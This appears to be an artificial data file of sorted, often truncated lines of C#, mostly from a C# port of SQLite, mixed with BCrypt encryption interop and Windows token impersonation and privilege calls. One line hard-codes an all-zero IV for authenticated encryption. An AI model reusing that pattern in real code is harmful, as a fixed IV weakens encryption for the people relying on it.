"            WHERETRACE( ""...... range reduces nRow to %.9g and cost to %.9g"
"            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]"
"            [MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)]"
"            _pOrWC, pOrWC.nTerm - _pOrWC//( pOrTerm - pOrWC.a ), ( pTerm - pWC.a )"
"            aJournalMagic.CopyTo( zHeader, 0 )"
"            addWhereTerm( pParse, zName, pLeftTab, pLeft.zAlias,"
"            addr = sqlite3VdbeAddOp1( v, op, r1 )"
"            addr = sqlite3VdbeAddOp2( v, OP_OpenEphemeral, (int)pExpr.iTable, !isRowid )"
"            addr = sqlite3VdbeAddOp2( v, OP_OpenEphemeral, tab1, 0 )"
"            addr = sqlite3VdbeAddOp2( v, OP_OpenEphemeral, tab2, 0 )"
"            all.z = yymsp[-3].minor.yy0.z.Substring(0, all.n)"
"            any one time. Existing SHARED locks may persist, but no new"
"            appendSpace( pAccum, nspace )"
"            bestBtreeIndex( pParse, pWC, pTabItem, notReady, pOrderBy, ref sCost )"
"            btreeParseCellPtr( pNew, apCell[j], ref info )"
"            btreeParseCellPtr( pPage, pCell, ref info )"
"            bufStr.ToCharArray().CopyTo( buf, 0 )"
"            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }"
"            byte[] keyBlob = Concat(BCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(0x1), BitConverter.GetBytes(key.Length), key)"
"            byte[] objLength = GetProperty(hAlg, BCrypt.BCRYPT_OBJECT_LENGTH)"
"            byte[] pBuf = (byte[])va_arg( ap, ""byte[]"" )"
"            byte[] tagLengthsValue = GetProperty(hAlg, BCrypt.BCRYPT_AUTH_TAG_LENGTH)"
"            c = (char)va_arg( ap, ""char"" )"
"            c = sqlite3Utf8Read( zPattern, ref zPattern )"
"            c2 = sqlite3Utf8Read( zPattern, ref zPattern )"
"            checkAppendMsg(pCheck, """","
"            checkAppendMsg(pCheck, null,"
"            checkAppendMsg(pCheck, zContext, ""Child page depth differs"")"
"            checkAppendMsg(pCheck, zContext,"
"            checkPtrmap(pCheck, (u32)i, PTRMAP_OVERFLOW2, (u32)iPage, zContext)"
"            checkPtrmap(pCheck, (u32)iPage, PTRMAP_FREEPAGE, 0, zContext)"
"            checkPtrmap(pCheck, (u32)pgno, PTRMAP_BTREE, (u32)iPage, zContext)"
"            checkPtrmap(pCheck, pgnoOvfl, PTRMAP_OVERFLOW1, (u32)iPage, zContext)"
"            cksum = pager_cksum( pPager, pData2 )"
"            codeCompare( pParse, pExpr.pLeft, pExpr.pRight, op,"
"            codeCompare( pParse, pLeft, pRight, OP_Ge,"
"            codeCompare( pParse, pLeft, pRight, OP_Le, r1, r2, r4, SQLITE_STOREP2 )"
"            codeCompareOperands( pParse, pExpr.pLeft, ref  r1, ref  regFree1,"
"            codeCompareOperands( pParse, pExpr.pLeft, ref r1, ref regFree1,"
"            codeCompareOperands( pParse, pLeft, ref r1, ref regFree1,"
"            codeInteger( v, pExpr, false, target )"
"            codeReal( v, pExpr.u.zToken, false, target )"
"            computeLimitRegisters( pParse, p, iBreak )"
"            disableTerm( pLevel, pOther )"
"            do { } while ( ReadNextRow( statement.VirtualMachine(), table ) == CSSQLite.SQLITE_ROW )"
"            eType = sqlite3FindInIndex( pParse, pExpr, ref rMayHaveNull )"
"            else if ( ap[vaNEXT - 1].GetType().Name == ""Int32"" )"
"            else if ( ap[vaNEXT - 1].GetType().Name == ""StringBuilder"" )"
"            else if ( z.ToString() == ""day"" )"
"            else if ( z.ToString() == ""utc"" )"
"            else if ( z.ToString() == ""year"" )"
"            exprAnalyze( pSrc, pWC, idxNew )"
"            exprAnalyzeAll( pSrc, pAndWC )"
"            exprX.iTable = sqlite3ExprCodeTemp( pParse, exprX, ref regFree1 )"
"            finalizeAggFunctions( pParse, sAggInfo )"
"            for ( i = 0, n = 0 "
"            for ( i = 1, c = (byte)z[iOffset "
"            for ( i = 3, c = (byte)z[iOffset "
"            for ( idx = precision, rounder = 0.5 "
"            freePage(pMove, ref rc)"
"            freePage(pPage, ref rc)"
"            fs = new FileStream( zConverted, dwCreationDisposition, dwDesiredAccess, dwShareMode, 1024, dwFlagsAndAttributes )"
"            getVarint(pPage.aData, pCell, ref nCellKey)"
"            iCol = resolveAsName( pParse, pEList, pE )"
"            iDb = sqlite3SchemaToIndex( db, pTab.pSchema )"
"            iPage = sqlite3Get4byte(aData, 8 "
"            iStart = sqlite3VdbeAddOp2( v, OP_RowKey, tab1, r1 )"
"            iTrunk = sqlite3Get4byte(pPage1.aData, 32)"
"            iTrunk = sqlite3Get4byte(pPrevTrunk.aData, 0)"
"            idxNew = whereClauseInsert( pWC, pDup, TERM_VIRTUAL "
"            idxNew = whereClauseInsert( pWC, pNew, TERM_VIRTUAL "
"            if ( !ExprHasAnyProperty( p, EP_TokenOnly ) )"
"            if ( !sqlite3IndexAffinityOk( pX, idxaff ) ) continue"
"            if ( ( columnCount = ReadColumnNames( vm, table ) ) == 0 ) return CSSQLite.SQLITE_ERROR"
"            if ( 0 == sqlite3BitvecTest( pPager.pInJournal, i ) "
"            if ( CSSQLite.sqlite3_open( DatabaseName, ref db ) != CSSQLite.SQLITE_OK )"
"            if ( ExprHasAnyProperty( pExpr, EP_TokenOnly ) )"
"            if ( ExprHasProperty( p, EP_xIsSelect ) )"
"            if ( ExprHasProperty( pExpr, EP_xIsSelect ) )"
"            if ( ExprHasProperty( pNew, EP_Reduced ) )"
"            if ( SQLITE_NOMEM == sqlite3BtreeSetPageSize( pBt, db.nextPagesize, -1, 0 ) )"
"            if ( SQLITE_OK == ( rc = sqlite3PagerCommitPhaseOne( pDestPager, null, true ) )"
"            if ( ap[vaNEXT - 1].GetType().Name == ""Byte[]"" )"
"            if ( ap[vaNEXT - 1].GetType().Name == ""Int64"" )"
"            if ( columnIndex( pLeftTab, zName ) < 0 "
"            if ( columnIndex( pRightTab, zName ) >= 0 )"
"            if ( findTerm( pWC, iCur, j, notReady, WO_GT "
"            if ( findTerm( pWC, iCur, j, notReady, WO_LT "
"            if ( pToken.n > 0 ) pNew.u.zToken = pToken.z.Substring( 0, pToken.n )"
"            if ( patternCompare( zPattern, zString, pInfo, esc ) ) return true"
"            if ( sqlite3BitvecSet( pBitvec, (u32)i "
"            if ( sqlite3ExprIsInteger( p.pLeft, ref v ) != 0 )"
"            if ( sqlite3Select( pParse, pSel, ref dest ) != 0 )"
"            if ( sqlite3StrICmp( p.aCol[j].zName, pFromCol.a[i].zName ) == 0 )"
"            if ( sqlite3StrICmp( pColumn.a[i].zName, pTab.aCol[j].zName ) == 0 )"
"            if ( sqlite3StrICmp( pList.a[i].zName, pTab.aCol[iCol].zName ) == 0 )"
"            if ( sqlite3StrICmp( zLeft, ""page_count"" ) == 0 )"
"            if ( sqlite3ViewGetColumnNames( pParse, pTab ) != 0 ) return WRC_Abort"
"            if ( xCallback( pArg, nCol, azVals, azCols ) != 0 )"
"            if ( z.ToString() == ""localtime"" )"
"            if ( z.ToString() == ""month"" )"
"            if ( z.ToString() == ""unixepoch"" "
"            if ( z.ToString().StartsWith( ""weekday "" ) "
"            if ( zName == """" ) break"
"            if ( zWhere == """" )"
"            if (!AdjustTokenPrivileges(hToken, false, ref tp, (UInt32)Marshal.SizeOf(tp), ref oldState, out UInt32 returnLength)) return false"
"            if (!DuplicateToken(hToken, 2, ref DuplicatedToken)) return false"
"            if (!LookupPrivilegeValue(null, Privilege, out luid)) return false"
"            if (!OpenProcessToken(hProcess, TOKEN_IMPERSONATE "
"            if (!OpenProcessToken(hProcess, TOKEN_QUERY "
"            if (!OpenProcessToken(hProcess, TOKEN_QUERY, out hToken)) return false"
"            if (!PrivilegeCheck(hToken, ref privs, out ret)) return false"
"            if (!SetThreadToken(IntPtr.Zero, DuplicatedToken)) return false"
"            if (sqlite3Get4byte(pPage.aData, pCell) == iFrom)"
"            if (yymsp[-2].minor.yy328 != 0) yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_NOT, yygotominor.yy346.pExpr, 0, 0)"
"            if (yymsp[-2].minor.yy96.not) yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_NOT, yygotominor.yy346.pExpr, 0, 0)"
"            if (yymsp[-3].minor.yy328 != 0) yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_NOT, yygotominor.yy346.pExpr, 0, 0)"
"            if (yymsp[0].minor.yy0.n > 0) sqlite3ExprListSetName(pParse, yygotominor.yy14, yymsp[0].minor.yy0, 1)"
"            if( (0==sqlite3StrNICmp("" hidden"", "
"            inReg = codeAlias( pParse, pExpr.iTable, pExpr.pLeft, target )"
"            inReg = sqlite3ExprCodeTarget( pParse, pExpr.pLeft, target )"
"            int aff, to_op"
"            int cnt = (int)va_arg( ap, ""int"" )"
"            int i, j"
"            int iCont, iBreak, iStart"
"            int iDb = sqlite3SchemaToIndex( pParse.db, pTab.pSchema )"
"            int j2, j3, j4, j5"
"            int keyDataSize = BitConverter.ToInt32(objLength, 0)"
"            int n1, n2"
"            int rc = btreeGetPage(pBt, iLastPg, ref pPg, 0)"
"            int sz = (int)va_arg( ap, ""int"" )"
"            int tab1, tab2"
"            int x = (int)va_arg( ap, ""int"" )"
"            int[] aProg = (int[])va_arg( ap, ""int[]"" )"
"            j2 = sqlite3VdbeAddOp1( v, OP_IsNull, target )"
"            j2 = sqlite3VdbeAddOp3( v, OP_Eq, regRowid, 0, regRowid - 1 )"
"            lockingStrategy.LockFile( pFile, PENDING_BYTE, 1 )"
"            n = sqlite3AtoF( z.ToString(), ref r )"
"            nRow, cost )"
"            null, -1, dest, iCont, iBreak )"
"            p = pcacheMergeDirtyList( a[i], p )"
"            p.affinity = sqlite3CompareAffinity( pEList.a[0].pExpr, pDest.affinity )"
"            pColl = sqlite3BinaryCompareCollSeq( pParse, pX.pLeft, pX.pRight )"
"            pColl = sqlite3ExprCollSeq( pParse, pItem.pExpr )"
"            pColl = sqlite3FindCollSeq( db, ENC( db ), zColl, 0 )"
"            pData.pzErrMsg = sqlite3MAppendf( db, pData.pzErrMsg"
"            pDef = sqlite3FindFunction( pParse.db, zId, nId, n, enc, 0 )"
"            pDef = sqlite3FindFunction( pParse.db, zId, nId, nFarg, enc, 0 )"
"            pDef, P4_FUNCDEF )"
"            pDup = sqlite3ExprDup( db, pExpr, 0 )"
"            pDup = sqlite3ExprDup( db, pOrTerm.pExpr.pRight, 0 )"
"            pEList.a[i].zSpan, SQLITE_DYNAMIC )"
"            pExpr.pRight, ref r2, ref regFree2 )"
"            pFrom.pSelect = sqlite3SelectDup( db, pTab.pSelect, 0 )"
"            pIn.addrInTop = sqlite3VdbeAddOp2( v, OP_Rowid, iTab, iReg )"
"            pIn.addrInTop = sqlite3VdbeAddOp3( v, OP_Column, iTab, 0, iReg )"
"            pItem.pExpr = pE = sqlite3Expr( db, TK_INTEGER, null )"
"            pKey, P4_KEYINFO_HANDOFF )"
"            pKeyDup.aColl[i] = multiSelectCollSeq( pParse, p, i )"
"            pKeyInfo, P4_KEYINFO_HANDOFF )"
"            pList = sqlite3ExprListAppend( pWC.pParse, pList, pDup )"
"            pList = sqlite3ExprListAppend(pParse, 0, yymsp[-1].minor.yy346.pExpr)"
"            pList = sqlite3ExprListAppend(pParse, pList, yymsp[-3].minor.yy346.pExpr)"
"            pList = sqlite3ExprListAppend(pParse, pList, yymsp[0].minor.yy346.pExpr)"
"            pNew = sqlite3ExprListAppend( pParse, pNew, a[k].pExpr )"
"            pOp = sqlite3VdbeGetOp( v, -1 )"
"            pOp = sqlite3VdbeGetOp( v, k )"
"            pOrderBy = sqlite3ExprListAppend( pParse, pOrderBy, pNew )"
"            pPager.jfd, zHeader, zHeader.Length, pPager.journalHdr"
"            pPager.journalOff, pPager.pageSize )"
"            pRight, ref r2, ref regFree2 )"
"            pRight.iCursor, ref p.pWhere, isOuter )"
"            pRightTab, pRight.zAlias,"
"            pSel.pLimit = sqlite3PExpr( pParse, TK_INTEGER, null, null, one )"
"            pSelTab = sqlite3ResultSetOfSelect( pParse, pSelect )"
"            pTab = sqlite3LocateTable( pParse, 0, z, null )"
"            pTab = sqlite3LocateTable( pParse, 0, z, zDb )"
"            pTable->azModuleArg[0], pParse->db->aDb[iDb].zName)"
"            pWInfo = sqlite3WhereBegin( pParse, pTabList, pWhere, ref pMinMax, (byte)flag )"
"            pc = (u16)get2byte(data, cellOffset "
"            precision = (int)va_arg( ap, ""int"" )"
"            printf( ""VDBE Execution Trace:"
"            ptrmapPut(pBt, pNew.pgno, PTRMAP_BTREE, pParent.pgno, ref rc)"
"            ptrmapPut(pBt, pgnoOvfl, eType, pgnoPtrmap, ref rc)"
"            ptrmapPutOvflPtr(pNew, pCell, ref rc)"
"            public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag) : this()"
"            public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)"
"            put32bits( zHeader, aJournalMagic.Length, pPager.nRec )"
"            r1 = sqlite3ExprCodeTemp( pParse, pExpr, ref regFree1 )"
"            r1 = sqlite3ExprCodeTemp( pParse, pExpr.pLeft, ref regFree1 )"
"            r1, r2, dest, jumpIfNull )"
"            r1, r2, inReg, SQLITE_STOREP2 )"
"            r1, r2, r3, SQLITE_STOREP2 )"
"            r2 = sqlite3ExprCodeTemp( pParse, pExpr.pRight, ref regFree2 )"
"            r2 = sqlite3ExprCodeTemp( pParse, pRight, ref regFree2 )"
"            rc = addToSavepointBitvecs( pPager, pgno )"
"            rc = allocateBtreePage(pBt, ref pFreePg, ref iFreePg, 0, 0)"
"            rc = allocateBtreePage(pBt, ref pFreePg, ref iFreePg, iLastPg, 1)"
"            rc = balance_deeper(pPage, ref pCur.apPage[1])"
"            rc = bindText( pStmt, i, pValue.z, pValue.n, SQLITE_TRANSIENT,"
"            rc = btreeGetPage(pBt, iTrunk, ref pTrunk, 0)"
"            rc = btreeGetPage(pBt, maxRootPgno, ref pMove, 0)"
"            rc = btreeSetHasContent(pBt, iPage)"
"            rc = getOverflowPage(pBt, nextPage, ref  MemPageDummy, ref nextPage)"
"            rc = pColl.xCmp( pColl.pUser, n1, v1, n2, v2 )"
"            rc = pager_playback( pPager, 1 )"
"            rc = pager_wait_on_lock( pPager, EXCLUSIVE_LOCK )"
"            rc = relocatePage(pBt, pLastPg, eType, iPtrPage, iFreePg, (nFin != 0) "
"            rc = relocatePage(pBt, pMove, PTRMAP_ROOTPAGE, 0, iTable, 0)"
"            rc = setupLookaside( db, pBuf, sz, cnt )"
"            rc = sqlite3BitvecBuiltinTest( (u32)sz, aProg )"
"            rc = sqlite3BitvecSet( pPager.pInJournal, pPg.pgno )"
"            rc = sqlite3BtreeCommitPhaseOne( pBt, null )"
"            rc = sqlite3BtreeCommitPhaseOne( pBt, zMaster )"
"            rc = sqlite3ExprIsInteger( p.pLeft, ref  pValue )"
"            rc = sqlite3GetInt32( p.u.zToken, ref pValue ) "
"            rc = sqlite3OsAccess( pVfs, pPager.zJournal, SQLITE_ACCESS_EXISTS, ref res )"
"            rc = sqlite3OsDelete( pPager.pVfs, pPager.zJournal, 0 )"
"            rc = sqlite3OsFileControl( fd, (u32)op, ref pArg )"
"            rc = sqlite3OsLock( pPager.fd, EXCLUSIVE_LOCK )"
"            rc = sqlite3OsRead( pPager.fd, dbFileVers, dbFileVers.Length, 24 )"
"            rc = sqlite3OsRead( pPager.jfd, aMagic, 8, iNextHdrOffset )"
"            rc = sqlite3OsSync( pPager.jfd, pPager.sync_flags "
"            rc = sqlite3OsTruncate( pPager.fd, newSize )"
"            rc = sqlite3OsTruncate( pPager.jfd, (int)iLimit )"
"            rc = sqlite3OsTruncate( pPager.jfd, 0 )"
"            rc = sqlite3OsWrite( pMaster, Encoding.UTF8.GetBytes( zFile ), sqlite3Strlen30( zFile ), offset )"
"            rc = sqlite3OsWrite( pPager.fd, new byte[1], 1, newSize - 1 )"
"            rc = sqlite3OsWrite( pPager.fd, zBuf, pPager.pageSize, 0 )"
"            rc = sqlite3PagerBegin(pBt.pPager, wrflag > 1, sqlite3TempInMemory(p.db) "
"            rc = sqlite3PagerCommitPhaseOne( pDestPager, null, false )"
"            rc = sqlite3PagerGet( pSrcPager, (u32)iSrcPg, ref pSrcPg )"
"            rc = sqlite3PagerGet(pBt.pPager, nextPage, ref pDbPage)"
"            rc = sqlite3Select( pParse, p, ref  uniondest )"
"            rc = sqlite3Select( pParse, p, ref dest )"
"            rc = sqlite3Select( pParse, p, ref intersectdest )"
"            rc = sqlite3Select( pParse, pPrior, ref dest )"
"            rc = sqlite3Select( pParse, pPrior, ref intersectdest )"
"            rc = sqlite3Select( pParse, pPrior, ref uniondest )"
"            rc = sqlite3VdbeChangeEncoding( pVar, ENC( p.db ) )"
"            rc = sqlite3_bind_double( pStmt, i, pValue.r )"
"            rc = sqlite3_bind_int64( pStmt, i, pValue.u.i )"
"            rc = sqlite3_bind_null( pStmt, i )"
"            rc = vdbeCommit( db, p )"
"            rc = write32bits( pPager.jfd, pPager.journalOff, (u32)pPg.pgno )"
"            realvalue = (double)va_arg( ap, ""double"" )"
"            ref PRIVILEGE_SET RequiredPrivileges,"
"            regBase = sqlite3GetTempRange( pParse, nCol )"
"            registerTrace( p.trace, pOp.p2, pOut )"
"            registerTrace( p.trace, pOp.p3, pOut )"
"            resetAccumulator( pParse, sAggInfo )"
"            resolveOutOfRangeError( pParse, zType, i "
"            return ""NULL"""
"            return BitConverter.ToInt32(new[] { tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7] }, 0)"
"            return OpenProcess(flags, false, proc.Id)"
"            return int.Parse( moPDisk[""BytesPerSector""].ToString() )"
"            return lookupName( pParse, null, null, pExpr.u.zToken, pNC, pExpr )"
"            return lookupName( pParse, zDb, zTable, zColumn, pNC, pExpr )"
"            return pColl.xCmp( pColl.pUser, pMem1.n, pMem1.z, pMem2.n, pMem2.z )"
"            return pager_error( pPager, rc )"
"            return yy_find_shift_action(pParser, iFallback)"
"            returnSingleInt( pParse, ""max_page_count"", newMax )"
"            returnSingleInt( pParse, ""page_size"", size )"
"            selectInnerLoop( pParse, p, p.pEList, tab1, p.pEList.nExpr,"
"            size = cellSizePtr(pPage, data, pc)"
"            spanExpr(v, pParse, TK_STRING, yymsp[0].minor.yy0)"
"            spanExpr(yygotominor.yy346, pParse, TK_VARIABLE, yymsp[0].minor.yy0)"
"            spanSet(yygotominor.yy346, yymsp[-2].minor.yy0, yymsp[0].minor.yy0)"
"            spanSet(yygotominor.yy346, yymsp[-3].minor.yy0, yymsp[0].minor.yy0)"
"            spanSet(yygotominor.yy346, yymsp[-4].minor.yy0, yymsp[0].minor.yy0)"
"            spanSet(yygotominor.yy346, yymsp[-5].minor.yy0, yymsp[0].minor.yy0)"
"            spanSet(yygotominor.yy346, yymsp[0].minor.yy0, yymsp[0].minor.yy0)"
"            sqlite3AddColumn(pParse, yymsp[0].minor.yy0)"
"            sqlite3AddDefaultValue(pParse, v)"
"            sqlite3AlterBeginAddColumn(pParse, yymsp[0].minor.yy65)"
"            sqlite3AlterFinishAddColumn(pParse, yymsp[0].minor.yy0)"
"            sqlite3AlterRenameTable(pParse, yymsp[-3].minor.yy65, yymsp[0].minor.yy0)"
"            sqlite3Attach(pParse, yymsp[-3].minor.yy346.pExpr, yymsp[-1].minor.yy346.pExpr, yymsp[0].minor.yy132)"
"            sqlite3BeginTrigger(pParse, yymsp[-7].minor.yy0, yymsp[-6].minor.yy0, yymsp[-5].minor.yy328, yymsp[-4].minor.yy378.a, yymsp[-4].minor.yy378.b, yymsp[-2].minor.yy65, yymsp[0].minor.yy132, yymsp[-10].minor.yy328, yymsp[-8].minor.yy328)"
"            sqlite3BenignMallocHooks( xBenignBegin, xBenignEnd )"
"            sqlite3BitvecClear( pPager.pInJournal, needSyncPgno, pTemp )"
"            sqlite3CodeSubselect( pParse, pExpr, 0, false )"
"            sqlite3CodeVerifySchema( pParse, iDb )"
"            sqlite3ColumnDefault( v, pTab, i, regData "
"            sqlite3CompareAffinity( p.pEList.a[0].pExpr, pDest.affinity )"
"            sqlite3CreateForeignKey(pParse, yymsp[-6].minor.yy14, yymsp[-3].minor.yy0, yymsp[-2].minor.yy14, yymsp[-1].minor.yy328)"
"            sqlite3CreateIndex(pParse, yymsp[-6].minor.yy0, yymsp[-5].minor.yy0,"
"            sqlite3CreateView(pParse, yymsp[-7].minor.yy0, yymsp[-3].minor.yy0, yymsp[-2].minor.yy0, yymsp[0].minor.yy3, yymsp[-6].minor.yy328, yymsp[-4].minor.yy328)"
"            sqlite3DebugPrintf( "" AS %s"", pItem.zAlias )"
"            sqlite3DebugPrintf( ""%"
"            sqlite3DebugPrintf( ""%s"", pItem.zName )"
"            sqlite3DebugPrintf( ""("
"            sqlite3DebugPrintf( ""(table: %s)"", pItem.pTab.zName )"
"            sqlite3DebugPrintf( "","" )"
"            sqlite3DeferForeignKey(pParse, yymsp[0].minor.yy328)"
"            sqlite3DeleteFrom(pParse, yymsp[-2].minor.yy65, yymsp[0].minor.yy132)"
"            sqlite3DeleteTriggerStep(pParse.db, ref (yypminor.yy473))"
"            sqlite3Detach(pParse, yymsp[0].minor.yy346.pExpr)"
"            sqlite3DropTable(pParse, yymsp[0].minor.yy65, 0, yymsp[-1].minor.yy328)"
"            sqlite3DropTable(pParse, yymsp[0].minor.yy65, 1, yymsp[-1].minor.yy328)"
"            sqlite3DropTrigger(pParse, yymsp[0].minor.yy65, yymsp[-1].minor.yy328)"
"            sqlite3EndTable(pParse, 0, 0, yymsp[0].minor.yy3)"
"            sqlite3EndTable(pParse, yymsp[-1].minor.yy0, yymsp[0].minor.yy0, 0)"
"            sqlite3Error( db, rc, ""database schema is locked: %s"", zDb )"
"            sqlite3Error( pErrorDb, pParse.rc, ""%s"", pParse.zErrMsg )"
"            sqlite3ErrorMsg( pName.pParse, ""invalid name: "
"            sqlite3ErrorMsg( pParse, ""DISTINCT aggregates must have exactly one "" "
"            sqlite3ErrorMsg( pParse, ""a NATURAL join may not have "" "
"            sqlite3ErrorMsg( pParse, ""cannot use index: %s"", pIdx.zName )"
"            sqlite3ErrorMsg( pParse, ""index %s already exists"", zName )"
"            sqlite3ErrorMsg( pParse, ""no such column: %s"", pChanges.a[i].zName )"
"            sqlite3ErrorMsg( pParse, ""table %T already exists"", pName )"
"            sqlite3ErrorMsg( pParse, ""there is already a table named %s"", zName )"
"            sqlite3ErrorMsg( pParse, ""too many terms in compound SELECT"" )"
"            sqlite3ErrorMsg( pParse,"
"            sqlite3ErrorMsg(pParse,"
"            sqlite3ExprAssignVarNumber(pParse, yygotominor.yy346.pExpr)"
"            sqlite3ExprCacheAffinityChange( pParse, inReg, 1 )"
"            sqlite3ExprCacheAffinityChange( pParse, pIn.iMem, 1 )"
"            sqlite3ExprCacheAffinityChange( pParse, pIn.iMem, pIn.nMem )"
"            sqlite3ExprCacheAffinityChange( pParse, r1, nFarg )"
"            sqlite3ExprCacheAffinityChange( pParse, regRow, 1 )"
"            sqlite3ExprCachePop( pParse, 1 )"
"            sqlite3ExprCode( pParse, pChanges.a[j].pExpr, regData "
"            sqlite3ExprCode( pParse, pExpr.pLeft, target )"
"            sqlite3ExprCode( pParse, pList.a[j].pExpr, iRegStore )"
"            sqlite3ExprCode( pParse, pList.a[keyColumn].pExpr, regRowid )"
"            sqlite3ExprCode( pParse, pList.a[keyColumn].pExpr, regTrigRowid )"
"            sqlite3ExprCode( pParse, pTab.aCol[i].pDflt, iRegStore )"
"            sqlite3ExprCode( pParse, pTab.aCol[i].pDflt, regCols "
"            sqlite3ExprCodeAndCache( pParse, pList.a[j].pExpr, regCols "
"            sqlite3ExprCodeExprList( pParse, pGroupBy, regBase, false )"
"            sqlite3ExprCodeMove( pParse, pIn.iMem, pDest.iMem, pDest.nMem )"
"            sqlite3ExprCodeMove( pParse, pIn.iMem, pDest.iParm, 1 )"
"            sqlite3ExprCodeMove( pParse, regRow, iParm, 1 )"
"            sqlite3ExprDelete( db, ref p.pLimit )"
"            sqlite3ExprDelete( db, ref pE )"
"            sqlite3ExprDelete( db, ref whenExpr )"
"            sqlite3ExprDelete( pParse.db, ref pSel.pLimit )"
"            sqlite3ExprDelete(pParse.db, ref (yypminor.yy132))"
"            sqlite3ExprDelete(pParse.db, ref (yypminor.yy346).pExpr)"
"            sqlite3ExprIfFalse( pParse, exprAnd, dest, jumpIfNull )"
"            sqlite3ExprIfFalse( pParse, pExpr.pLeft, d2, jumpIfNull "
"            sqlite3ExprIfFalse( pParse, pExpr.pLeft, dest, jumpIfNull )"
"            sqlite3ExprIfFalse( pParse, pExpr.pRight, dest, jumpIfNull )"
"            sqlite3ExprIfTrue( pParse, exprAnd, dest, jumpIfNull )"
"            sqlite3ExprIfTrue( pParse, pExpr.pLeft, d2, jumpIfNull "
"            sqlite3ExprIfTrue( pParse, pExpr.pLeft, dest, jumpIfNull )"
"            sqlite3ExprIfTrue( pParse, pExpr.pRight, dest, jumpIfNull )"
"            sqlite3ExprListCheckLength(pParse, yygotominor.yy14, ""index"")"
"            sqlite3ExprListCheckLength(pParse, yymsp[-1].minor.yy14, ""set list"")"
"            sqlite3ExprListDelete( db, ref p.pOrderBy )"
"            sqlite3ExprListDelete( db, ref pList )"
"            sqlite3ExprListDelete(pParse.db, ref  (yypminor.yy14))"
"            sqlite3ExprListSetName(pParse, yygotominor.yy14, yymsp[-2].minor.yy0, 1)"
"            sqlite3ExprListSetSpan(pParse, yygotominor.yy14, yymsp[-1].minor.yy346)"
"            sqlite3FinishTrigger(pParse, yymsp[-1].minor.yy473, all)"
"            sqlite3GenerateRowDelete( pParse, pTab, iCur, iRowid, pParse.nested == 0 "
"            sqlite3GlobalConfig.bMemstat = (int)va_arg( ap, ""int"" ) != 0"
"            sqlite3GlobalConfig.m = (sqlite3_mem_methods)va_arg( ap, ""sqlite3_mem_methods"" )"
"            sqlite3GlobalConfig.nLookaside = (int)va_arg( ap, ""int"" )"
"            sqlite3GlobalConfig.nPage = (int)va_arg( ap, ""int"" )"
"            sqlite3GlobalConfig.nScratch = (int)va_arg( ap, ""int"" )"
"            sqlite3GlobalConfig.pPage = (MemPage)va_arg( ap, ""MemPage"" )"
"            sqlite3GlobalConfig.pScratch = (byte[])va_arg( ap, ""byte[]"" )"
"            sqlite3GlobalConfig.szLookaside = (int)va_arg( ap, ""int"" )"
"            sqlite3GlobalConfig.szPage = (int)va_arg( ap, ""int"" )"
"            sqlite3GlobalConfig.szScratch = (int)va_arg( ap, ""int"" )"
"            sqlite3IdListDelete(pParse.db, ref (yypminor.yy378).b)"
"            sqlite3IdListDelete(pParse.db, ref (yypminor.yy408))"
"            sqlite3NestedParse( pParse,"
"            sqlite3PcacheSetPageSize( pPager.pPCache, pageSize )"
"            sqlite3PrintSelect( pItem.pSelect, indent "
"            sqlite3Put4byte(pTrunk.aData, (u32)4, nLeaf "
"            sqlite3Put4byte(pTrunk.aData, (u32)8 "
"            sqlite3ReleaseTempRange( pParse, regBase, nCol )"
"            sqlite3ReleaseTempReg( pParse, r1 )"
"            sqlite3ReleaseTempReg( pParse, r2 )"
"            sqlite3ReleaseTempReg( pParse, r3 )"
"            sqlite3ReleaseTempReg( pParse, r4 )"
"            sqlite3ReleaseTempReg( pParse, regBase )"
"            sqlite3ReleaseTempReg( pParse, regFree2 )"
"            sqlite3ReleaseTempReg( pParse, regRecord )"
"            sqlite3ResetInternalSchema( p.pDestDb, 0 )"
"            sqlite3ResolveSelectNames( pParse, pItem.pSelect, pOuterNC )"
"            sqlite3Savepoint(pParse, SAVEPOINT_BEGIN, yymsp[0].minor.yy0)"
"            sqlite3Savepoint(pParse, SAVEPOINT_RELEASE, yymsp[0].minor.yy0)"
"            sqlite3Savepoint(pParse, SAVEPOINT_ROLLBACK, yymsp[0].minor.yy0)"
"            sqlite3Select(pParse, yymsp[0].minor.yy3, ref dest)"
"            sqlite3SelectDelete(pParse.db, ref (yypminor.yy3))"
"            sqlite3SelectDelete(pParse.db, ref yymsp[0].minor.yy3)"
"            sqlite3SelectDestInit( dest, 0, "
"            sqlite3SelectDestInit( intersectdest, SRT_Union, tab1 )"
"            sqlite3SelectDestInit( uniondest, priorOp, unionTab )"
"            sqlite3SetString( ref pzErrMsg, db, ""attached databases must use the same"" "
"            sqlite3SrcListAppend(pParse.db, 0, yymsp[-3].minor.yy0, 0), yymsp[-1].minor.yy14, yymsp[-9].minor.yy328,"
"            sqlite3SrcListAssignCursors( pParse, pItem.pSelect.pSrc )"
"            sqlite3SrcListDelete(pParse.db, ref  (yypminor.yy65))"
"            sqlite3SrcListIndexedBy(pParse, yygotominor.yy65, yymsp[-2].minor.yy0)"
"            sqlite3SrcListIndexedBy(pParse, yymsp[-2].minor.yy65, yymsp[-1].minor.yy0)"
"            sqlite3SrcListIndexedBy(pParse, yymsp[-4].minor.yy65, yymsp[-3].minor.yy0)"
"            sqlite3StartTable(pParse, yymsp[-1].minor.yy0, yymsp[0].minor.yy0, yymsp[-4].minor.yy328, 0, 0, yymsp[-2].minor.yy328)"
"            sqlite3StatusAdd( SQLITE_STATUS_MEMORY_USED, nNew - nOld )"
"            sqlite3TableLock( pParse, iDb, pTab.tnum, 0, pTab.zName )"
"            sqlite3Update(pParse, yymsp[-4].minor.yy65, yymsp[-1].minor.yy14, yymsp[0].minor.yy132, yymsp[-5].minor.yy186)"
"            sqlite3VdbeAddOp1( v, OP_Close, iCsr )"
"            sqlite3VdbeAddOp1( v, OP_Close, pLevel.iIdxCur )"
"            sqlite3VdbeAddOp1( v, OP_Close, pTabItem.iCursor )"
